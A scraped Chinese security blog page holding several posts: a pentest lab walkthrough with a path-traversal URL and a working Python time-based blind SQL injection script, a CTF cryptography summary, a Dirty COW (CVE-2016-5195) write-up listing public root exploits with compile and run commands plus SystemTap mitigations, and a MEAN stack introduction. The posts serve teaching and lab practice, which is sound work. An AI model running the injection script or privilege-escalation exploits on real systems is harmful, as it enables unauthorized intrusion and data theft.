<p><a href="http://10.102.94.210/pentest/test/13/?country=../../../index.html" target="_blank" rel="noopener">http://10.102.94.210/pentest/test/13/?country=../../../index.html</a></p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522062643540.png" alt="52206264354"></p>
<h3 id="第二关-提交方式是怎么样的啊？"><a href="#第二关-提交方式是怎么样的啊？" class="headerlink" title="第二关:提交方式是怎么样的啊？"></a>第二关:提交方式是怎么样的啊？</h3><p><a href="http://10.102.94.210/pentest/test/14/" target="_blank" rel="noopener">http://10.102.94.210/pentest/test/14/</a></p>
<p>post 方式文件 文件包含漏洞</p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522062882333.png" alt="52206288233"></p>
<h3 id="第三关-我还是一个注入"><a href="#第三关-我还是一个注入" class="headerlink" title="第三关:我还是一个注入"></a>第三关:我还是一个注入</h3><p>host 头注入</p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522063148024.png" alt="52206314802"></p>
<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522063211793.png" alt="52206321179"></p>
<h3 id="第四关-APK里面有一个flag"><a href="#第四关-APK里面有一个flag" class="headerlink" title="第四关:APK里面有一个flag"></a>第四关:APK里面有一个flag</h3><p>逆向APK程序</p>
<h3 id="第五关-时间注入"><a href="#第五关-时间注入" class="headerlink" title="第五关:时间注入"></a>第五关:时间注入</h3><p><a href="http://10.102.94.210/pentest/test/time/" target="_blank" rel="noopener">http://10.102.94.210/pentest/test/time/</a>  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8 </span></span><br><span class="line"><span class="comment">#时间盲注脚本</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789@_.&#125;&#123;,'</span></span><br><span class="line"><span class="comment">#存放跑出的结果</span></span><br><span class="line">length=<span class="number">0</span></span><br><span class="line">database=<span class="string">''</span></span><br><span class="line">table=<span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'start get length...'</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">	startTime1=time.time()</span><br><span class="line">	url1 = <span class="string">"http://192.168.37.147/pentest/test/time/?type=1 and if(length(database())=%d,sleep(5),1)"</span>%(l)</span><br><span class="line">	response1 = requests.get(url1)</span><br><span class="line">	<span class="keyword">if</span> time.time() - startTime1 &gt; <span class="number">5</span>:</span><br><span class="line">		length=l</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"the length is "</span> + str(length)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'start database sql injection...'</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">		startTime2=time.time()</span><br><span class="line">		url2 = <span class="string">"http://192.168.37.147/pentest/test/time/?type=1 and if(substr(database(),'%d',1)='%s',sleep(5),1)"</span>%(d,payload)</span><br><span class="line">		response2 = requests.get(url2) <span class="comment">#发送请求</span></span><br><span class="line">		<span class="keyword">if</span> time.time() - startTime2 &gt; <span class="number">5</span>: <span class="comment">#判断是否延时了5秒 也就是 是否执行了函数sleep(5)</span></span><br><span class="line">			database+=payload</span><br><span class="line">			<span class="keyword">print</span> database</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"the database is "</span> + database</span><br></pre></td></tr></table></figure>
<h3 id="实战练习-DZ论坛"><a href="#实战练习-DZ论坛" class="headerlink" title="实战练习:DZ论坛"></a>实战练习:DZ论坛</h3><p>dz7.2</p>
<h3 id="实战练习-aspcms"><a href="#实战练习-aspcms" class="headerlink" title="实战练习:aspcms"></a>实战练习:aspcms</h3><h3 id="实战练习-phpmyadmin"><a href="#实战练习-phpmyadmin" class="headerlink" title="实战练习:phpmyadmin"></a>实战练习:phpmyadmin</h3><h3 id="实战练习-齐博系统"><a href="#实战练习-齐博系统" class="headerlink" title="实战练习:齐博系统"></a>实战练习:齐博系统</h3><h3 id="实战练习-海盗云商"><a href="#实战练习-海盗云商" class="headerlink" title="实战练习:海盗云商"></a>实战练习:海盗云商</h3><h3 id="实战练习-PHP168-6-0"><a href="#实战练习-PHP168-6-0" class="headerlink" title="实战练习:PHP168 6.0"></a>实战练习:PHP168 6.0</h3><h3 id="实战练习-ecshop"><a href="#实战练习-ecshop" class="headerlink" title="实战练习:ecshop"></a>实战练习:ecshop</h3><h3 id="实战练习-ShopXp系统v3-x"><a href="#实战练习-ShopXp系统v3-x" class="headerlink" title="实战练习:ShopXp系统v3.x"></a>实战练习:ShopXp系统v3.x</h3><h3 id="实战练习-Dcore-轻型CMS系统"><a href="#实战练习-Dcore-轻型CMS系统" class="headerlink" title="实战练习:Dcore(轻型CMS系统)"></a>实战练习:Dcore(轻型CMS系统)</h3><h3 id="实战练习-MetInfo-5-1-7"><a href="#实战练习-MetInfo-5-1-7" class="headerlink" title="实战练习:MetInfo 5.1.7"></a>实战练习:MetInfo 5.1.7</h3><h3 id="实战练习-Metinfo-5-3"><a href="#实战练习-Metinfo-5-3" class="headerlink" title="实战练习:Metinfo 5.3"></a>实战练习:Metinfo 5.3</h3><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0119166" target="_blank" rel="noopener">MetInfo 5.3 /include/global/listmod.php SQL 注入漏洞</a>:</p>
<h2 id="实战扩展"><a href="#实战扩展" class="headerlink" title="实战扩展"></a>实战扩展</h2><h2 id="漏洞知识"><a href="#漏洞知识" class="headerlink" title="漏洞知识"></a>漏洞知识</h2>
      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透/">渗透</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-CTF-密码学总结"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/03/02/CTF-密码学总结/">CTF-密码学总结</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/03/02/CTF-密码学总结/" class="article-date">
	  <time datetime="2017-03-02T15:53:56.000Z" itemprop="datePublished">2017-03-02</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CTF-密码学总结"><a href="#CTF-密码学总结" class="headerlink" title="CTF-密码学总结"></a>CTF-密码学总结</h1><p><a href="http://shackles.top/2016/11/08/%E5%AF%86%E7%A0%81%E5%AD%A6%20Crypto/"> 2016-11-08</a></p>
<h3 id="密码学-Crypto"><a href="#密码学-Crypto" class="headerlink" title="密码学 Crypto"></a>密码学 Crypto</h3><h5 id="Alice-与-Bob"><a href="#Alice-与-Bob" class="headerlink" title="Alice 与 Bob"></a>Alice 与 Bob</h5><p>密码体质的定义：密码学5元组<br>秘钥量</p>
<p>对称密码与非对称密码（公钥与私钥）；</p>
<h5 id="密码分析的分类"><a href="#密码分析的分类" class="headerlink" title="密码分析的分类"></a>密码分析的分类</h5><p>1、穷举攻击<br>2、统计分析攻击<br>3、数学分析攻击</p>
<p>唯密文攻击； 已知明文攻击； 选择明文攻击； 选择密文攻击；</p>
<h5 id="密码体制的安全性"><a href="#密码体制的安全性" class="headerlink" title="密码体制的安全性"></a>密码体制的安全性</h5><p>计算安全性；可证明安全性；无条件安全性；</p>
<h4 id="古典密码学"><a href="#古典密码学" class="headerlink" title="古典密码学"></a>古典密码学</h4><p>1、单表代换加密<br>明文与密文一一对应；<br>2、多表代换加密<br>已知加密算法破解；</p>
<h3 id="现代密码"><a href="#现代密码" class="headerlink" title="现代密码"></a>现代密码</h3><p>对称密码的设计原理： 密文的统计特性与使用的密钥独立；</p>
<h5 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h5><p>分组加密算法 ，密钥长度56位；（每个第8位作为奇偶校验位）</p>
<h5 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h5><h5 id="RC5"><a href="#RC5" class="headerlink" title="RC5"></a>RC5</h5><p>分组密码的加密的模式：</p>
<p>零知识证明</p>
<p><a href="http://quipqiup.com/" target="_blank" rel="noopener">http://quipqiup.com/</a> 词频分析</p>
<p>md5解密 <a href="http://www.dmd5.com" target="_blank" rel="noopener">www.dmd5.com</a> <a href="http://www.dmd5.com/" target="_blank" rel="noopener">http://www.dmd5.com/</a></p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-CVE-2016-5195（脏牛）内核提权"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/01/29/CVE-2016-5195（脏牛）内核提权/">CVE-2016-5195（脏牛）内核提权漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/01/29/CVE-2016-5195（脏牛）内核提权/" class="article-date">
	  <time datetime="2017-01-29T15:53:56.000Z" itemprop="datePublished">2017-01-29</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="CVE-2016-5195（脏牛）内核提权漏洞分析"><a href="#CVE-2016-5195（脏牛）内核提权漏洞分析" class="headerlink" title="CVE-2016-5195（脏牛）内核提权漏洞分析"></a>CVE-2016-5195（脏牛）内核提权漏洞分析</h2><h3 id="脏牛漏洞-提权"><a href="#脏牛漏洞-提权" class="headerlink" title="脏牛漏洞 提权"></a>脏牛漏洞 提权</h3><p>Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。</p>
<p>一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞</p>
<p><strong>漏洞危害：</strong>低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权</p>
<p><strong>影响范围：</strong>Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。</p>
<p><strong>360 Vulpecker Team：</strong>Android 7.0最新的10月补丁安全级别的系统上测试过漏洞POC，确认Android受影响</p>
<p>blog：Dirty COW (CVE-2016-5195)<br><a href="https://dirtycow.ninja/" target="_blank" rel="noopener">https://dirtycow.ninja/</a></p>
<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><h4 id="步骤1：编译POC"><a href="#步骤1：编译POC" class="headerlink" title="步骤1：编译POC"></a>步骤1：编译POC</h4><p>poc 地址：<a href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c" target="_blank" rel="noopener">https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c</a></p>
<p>执行以下命令进行gcc编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uanme -a </span><br><span class="line">whoami</span><br><span class="line"></span><br><span class="line">gcc -pthread dirtyc0w.c -o dirtyc0w   //编译</span><br></pre></td></tr></table></figure>
<p><code>gcc</code>命令是一个编译器套件，可用于编译多种语言源码。</p>
<blockquote>
<ul>
<li><strong>小i注解：</strong> 可见编译选项中指定<code>-pthread</code> 会附加一个宏定义 <code>-D_REENTRANT</code>该宏会导致 <code>libc</code> 头文件选择那些<code>thread-safe</code>的实现。<code>-o</code>参数为编译后输出文件名。</li>
</ul>
</blockquote>
<h4 id="步骤2：验证漏洞"><a href="#步骤2：验证漏洞" class="headerlink" title="步骤2：验证漏洞"></a>步骤2：验证漏洞</h4><p>POC:</p>
<table>
<thead>
<tr>
<th>Link</th>
<th>Usage</th>
<th>Description</th>
<th>Family</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>—</td>
<td>—</td>
<td>—</td>
<td>—</td>
<td>—</td>
<td>—</td>
<td>—</td>
</tr>
<tr>
<td><a href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c" target="_blank" rel="noopener">dirtyc0w.c</a></td>
<td><code>./dirtyc0w file content</code></td>
<td>Read-only write</td>
<td>/proc/self/mem</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679" target="_blank" rel="noopener">cowroot.c</a></td>
<td><code>./cowroot</code></td>
<td>SUID-based root</td>
<td>/proc/self/mem</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://gist.github.com/scumjr/17d91f20f73157c722ba2aea702985d2" target="_blank" rel="noopener">dirtycow-mem.c</a></td>
<td><code>./dirtycow-mem</code></td>
<td>libc-based root</td>
<td>/proc/self/mem</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c" target="_blank" rel="noopener">pokemon.c</a></td>
<td><code>./d file content</code></td>
<td>Read-only write</td>
<td>PTRACE_POKEDATA</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/xlucas/dirtycow.cr" target="_blank" rel="noopener">dirtycow.cr</a></td>
<td><code>dirtycow --target --string --offset</code></td>
<td>Read-only write</td>
<td>/proc/self/mem</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/timwr/CVE-2016-5195" target="_blank" rel="noopener">dirtyc0w.c</a></td>
<td><code>./dirtycow file content</code></td>
<td>Read-only write (Android)</td>
<td>/proc/self/mem</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/rapid7/metasploit-framework/pull/7476" target="_blank" rel="noopener">dirtycow.rb</a></td>
<td><code>use exploit/linux/local/dirtycow</code> and <code>run</code></td>
<td>SUID-based root</td>
<td>/proc/self/mem</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/scumjr/dirtycow-vdso" target="_blank" rel="noopener">0xdeadbeef.c</a></td>
<td><code>./0xdeadbeef</code></td>
<td>vDSO-based root</td>
<td>PTRACE_POKEDATA</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://gist.github.com/mak/c36136ccdbebf5ecfefd80c0f2ed6747" target="_blank" rel="noopener">naughtyc0w.c</a></td>
<td><code>./c0w suid</code></td>
<td>SUID-based root</td>
<td>/proc/self/mem</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54" target="_blank" rel="noopener">c0w.c</a></td>
<td><code>./c0w</code></td>
<td>SUID-based root</td>
<td>PTRACE_POKEDATA</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://gist.github.com/ngaro/05e084ca638340723b309cd304be77b2" target="_blank" rel="noopener">dirty_pass[…].c</a></td>
<td><code>./dirty_passwd_adjust_cow</code></td>
<td>/etc/passwd based root</td>
<td>/proc/self/mem</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://gist.github.com/chriscz/f1aca56cf15cfb7793db0141c15718cd" target="_blank" rel="noopener">mucow.c</a></td>
<td><code>./mucow destination &lt; payload.exe</code></td>
<td>Read-only write (multi page)</td>
<td>PTRACE_POKEDATA</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/nowsecure/dirtycow" target="_blank" rel="noopener">cowpy.c</a></td>
<td><code>r2pm -i dirtycow</code></td>
<td>Read-only write (radare2)</td>
<td>/proc/self/mem</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/sivizius/dirtycow.fasm" target="_blank" rel="noopener">dirtycow.fasm</a></td>
<td><code>./main</code></td>
<td>SUID-based root</td>
<td>/proc/self/mem</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/gbonacini/CVE-2016-5195" target="_blank" rel="noopener">dcow.cpp</a></td>
<td><code>./dcow</code></td>
<td>/etc/passwd based root</td>
<td>/proc/self/mem</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/mengzhuo/dirty-cow-golang/blob/master/dirtyc0w.go" target="_blank" rel="noopener">dirtyc0w.go</a></td>
<td><code>go run dirtyc0w.go -f=file -c=content</code></td>
<td>Read-only write</td>
<td>/proc/self/mem</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/FireFart/dirtycow/blob/master/dirty.c" target="_blank" rel="noopener">dirty.c</a></td>
<td><code>./dirty</code></td>
<td>/etc/passwd based root</td>
<td>PTRACE_POKEDATA</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/sideeffect42/DirtyCOWTester" target="_blank" rel="noopener">Dirty COW Tester</a></td>
<td><code>make &amp;&amp; ./bin/dct</code></td>
<td>Read-only write</td>
<td>/proc/self/mem</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/hyln9/VIKIROOT" target="_blank" rel="noopener">exploit.c</a></td>
<td><code>./exploit</code></td>
<td>vDSO-based root (Android)</td>
<td>PTRACE_POKEDATA</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/securifera/cowcron" target="_blank" rel="noopener">cowcron.c</a></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="分析与思考"><a href="#分析与思考" class="headerlink" title="分析与思考"></a>分析与思考</h4><blockquote>
<ul>
<li>Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。</li>
<li>一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致某些Linux版本提权漏洞。</li>
<li>低权限用户可以利用该漏洞修改只读内存，进而执行任意代码获取Root权限。</li>
<li>该漏洞影响所有目前运行Linux系统的设备，包含但不限于运行Linux系统的服务器，Docker容器/手机/路由器/智能设备等。</li>
<li>Linux写时拷贝技术(copy-on-write)</li>
</ul>
<p>在Linux程序中，fork（）会产生一个和父进程完全相同的子进程，但子进程在此后多会exec系统调用，出于效率考虑，linux中引入了“写时复制“技术，也就是只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程</p>
<ul>
<li><strong>竞态条件</strong></li>
</ul>
<p>竞态条件（race condition）是指设备或系统出现不恰当的执行时序，而得到不正确的结果。</p>
<ul>
<li><p>linux内存管理–缺页异常处理</p>
<p>触发异常的线性地址处于用户空间的vma中，但还未分配物理页，如果访问权限OK的话内核就给进程分配相应的物理页。</p>
<p>触发异常的线性地址不处于用户空间的vma中，这种情况得判断是不是因为用户进程的栈空间消耗完而触发的缺页异常。</p>
<p>如果 是的话则在用户空间对栈区域进行扩展，并且分配相应的物理页，如果不是则作为一次非法地址访问来处理，内核将终结进程</p>
</li>
</ul>
<ul>
<li><p><strong>缺页中断</strong></p>
<p>缺页中断就是要访问的页不在主存，需要操作系统将其调入主存后再进行访问。在这个时候，被内存映射的文件实际上成了一个分页交换文件。</p>
</li>
</ul>
</blockquote>
<h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><ul>
<li>更新最新Linux Kernel源码，并重新编译，也可直接升级最新版本。<ul>
<li>修复相关代码</li>
</ul>
</li>
</ul>
<p><code>https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/？id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619</code></p>
<h5 id="免重启热修补"><a href="#免重启热修补" class="headerlink" title="免重启热修补"></a>免重启热修补</h5><p>由于该漏洞位于 Linux 内核，发行版官方的内核更新只有在重启后才能生效。</p>
<ul>
<li><p>如果您的线上业务不能中断，可以采用下面这种基于 SystemTap 的热修补方法，并在合适的时候更新系统内核。</p>
<p>SystemTap 是监控和跟踪运行中的Linux 内核的操作的动态方法。这句话的关键词是动态，因为SystemTap 没有使用工具构建一个特殊的内核，而是允许您在运行时动态地安装该工具。</p>
</li>
</ul>
<p>针对 CVE-2016-5195 的 SystemTap 热修补补丁最先出现在 Red Hat 公司 Bug 追踪系统的讨论区（出处），内容节选如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">probe kernel.function(&quot;mem_write&quot;).call ? &#123; $count = 0 &#125;</span><br><span class="line"></span><br><span class="line">robe syscall.ptrace &#123; $request = 0xfff &#125;`</span><br></pre></td></tr></table></figure>
<p>通过阻止写入 /proc/self/mem 来达到阻止上述利用代码的目的。</p>
<p>该补丁有较为明显的副作用：无法调试程序，还可能导致 RHEL/CentOS 6 和 Ubuntu 14.04 上使用的 upstart 服务管理机制不能正常工作。</p>
<p>本文提供另一种热修补方式，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> probe kernel.function(&quot;sys_madvise&quot;) &#123;</span><br><span class="line">    if ($behavior == 4) &#123; $behavior = 0 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Ubuntu系统修复安装SystemTap相关步骤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gcc systemtap</span><br><span class="line"></span><br><span class="line">ddeb_filename=$(dpkg-query --show --showformat=&apos;$&#123;Package&#125;-dbgsym_$&#123;Version&#125;_$&#123;Architecture&#125;.ddeb&apos; linux-image-$(uname -r))</span><br><span class="line"></span><br><span class="line">wget http://ddebs.ubuntu.com/pool/main/l/linux/$&#123;ddeb_filename&#125;</span><br><span class="line"></span><br><span class="line">dpkg -i $&#123;ddeb_filename&#125;</span><br></pre></td></tr></table></figure>
<p>测试SystemTap安装成功：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stap -e &apos;probe begin &#123; print(&quot;hello world\n&quot;); exit(); &#125;&apos;</span><br></pre></td></tr></table></figure>
<p>执行热修补</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stap -Fge &apos;probe kernel.function(&quot;sys_madvise&quot;) &#123; if ($behavior == 4) &#123; $behavior = 0 &#125;&#125;&apos;</span><br><span class="line"></span><br><span class="line">Disconnecting from systemtap module.</span><br><span class="line">To reconnect, type &quot;staprun -A stap_9f8ce8307eb418da7c981b3223eec678_12644&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>修补完成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsmod | grep stap</span><br><span class="line">stap_9f8ce8307eb418da7c981b3223eec678_12644    81920  0</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>可以看到 SystemTap 编译出的内核模块已经成功加载。</p>
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><code>https://dirtycow.ninja/</code></p>
<p><code>https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619</code></p>
<p><code>http://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&amp;mid=2651370571&amp;idx=1&amp;sn=68acf07ca2683a9c98fa52e900d97db3&amp;chksm=8d39c5c3ba4e4cd58c21d0a21ca337ded2132625987e174d286f8d175034267bd09807ea9a11&amp;scene=4#wechat_redirect</code></p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-MEAN--全栈WEB开发框架"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2016/11/29/MEAN--全栈WEB开发框架/">MEAN--全栈WEB开发框架</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2016/11/29/MEAN--全栈WEB开发框架/" class="article-date">
	  <time datetime="2016-11-29T15:53:56.000Z" itemprop="datePublished">2016-11-29</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="MEAN–全栈WEB开发框架"><a href="#MEAN–全栈WEB开发框架" class="headerlink" title="MEAN–全栈WEB开发框架"></a>MEAN–全栈WEB开发框架</h1><p><a href="http://shackles.top/2016/12/01/tags-%20%20Web%20%E6%A1%86%E6%9E%B6/"> 2016-12-01</a></p>
<h1 id="MEAN-Mongode-Express-Angular-Node-js"><a href="#MEAN-Mongode-Express-Angular-Node-js" class="headerlink" title="MEAN Mongode + Express + Angular + Node.js"></a>MEAN Mongode + Express + Angular + Node.js</h1><blockquote>
<p>##全Javascript的开发架构<strong>MEAN</strong>。<br><a href="https://meanjs.org/img/logo.png" target="_blank" rel="noopener"><img src="https://meanjs.org/img/logo.png" alt="img"></a><br>js语言运行在应用程序的所有层次上，前端后端服务端从客户端到服务器，再到持久层一种语言运行在应用程序的所有层次上。</p>
</blockquote>
<ol>
<li><strong>(M</strong>)MongoDB——NoSQL的文档数据库，使用JSON风格来存储数据，查询较简单，甚至也是使用JS来进行sql查询；<br><a href="http://mean.io/wp-content/themes/twentysixteen-child/images/mongodb.png" target="_blank" rel="noopener"><img src="http://mean.io/wp-content/themes/twentysixteen-child/images/mongodb.png" alt="m"></a>m</li>
<li>(<strong>E</strong>)Express——较好的基于Node的Web开发框架，是一个最小的，灵活的Node.js Web应用程序框架，构建单页和多页，和混合Web应用程序提供了一套强大的功能；</li>
<li>(<strong>A</strong>)Aagular——JS的前端开发框架，提供了声明式的双向数据绑定；<a href="http://mean.io/wp-content/themes/twentysixteen-child/images/angularjs.png" target="_blank" rel="noopener"><img src="http://mean.io/wp-content/themes/twentysixteen-child/images/angularjs.png" alt="A"></a>A</li>
<li>(<strong>N</strong>)Node——跑在服务器的js，并发 异步 事件驱动，基于V8的运行时环境（JS语言开发），可以构建快速响应、可扩展的网络应用。<br><a href="http://mean.io/wp-content/themes/twentysixteen-child/images/nodejs.png" target="_blank" rel="noopener"><img src="http://mean.io/wp-content/themes/twentysixteen-child/images/nodejs.png" alt="n"></a>n</li>
</ol>
<p><a href="https://raohuaming.github.io/images/mean-stack.png" target="_blank" rel="noopener"><img src="https://raohuaming.github.io/images/mean-stack.png" alt="img"></a><br><em>1.架构框图</em><br>采用MVC架构。模型-视图-控制器 (MVC)</p>
<p><a href="http://simage.jdon.com/idea/meanarchitecture.png" target="_blank" rel="noopener"><img src="http://simage.jdon.com/idea/meanarchitecture.png" alt="img"></a><br>可以直接存储JSON格式的mongoDB数据库，</p>
<h3 id="1-从-LAMP-到-MEAN"><a href="#1-从-LAMP-到-MEAN" class="headerlink" title="1. 从 LAMP 到 MEAN"></a>1. 从 <a href="http://baike.baidu.com/link?url=xxWtinT946K5F6Ur9Vzt0st7GyosP3TlaybV1fNkN7BFlDF9TFN0xaTePZbcMTPQHKL2mC_2w6igSGtTQeqIda" target="_blank" rel="noopener">LAMP</a> 到 MEAN</h3><p>MEAN 不仅仅是一次首字母缩写的简单重新安排与技术升级。将基础平台从操作系统 (Linux) 转变为 JavaScript 运行时 (Node.js) 让操作系统变得独立：Node.js 在 Windows® 与 OS X 上的运行情况和在 Linux 上一样优秀。跨平台强。</p>
<h3 id="1-1"><a href="#1-1" class="headerlink" title="- 1.1"></a>- 1.1</h3><p>Node.js 同样取代了 LAMP 堆栈中的 Apache。但 Node.js 远远不止是一种简单的 Web 服务器。事实上，用户不会将完成后的应用程序部署到单机的 Web 服务器上；相反，Web 服务器已经包含在应用程序中，并已在 MEAN 堆栈中自动安装。结果，部署过程得到了极大简化，因为所需的 Web 服务器版本已经与余下的运行时依赖关系一起得到了明确定义。</p>
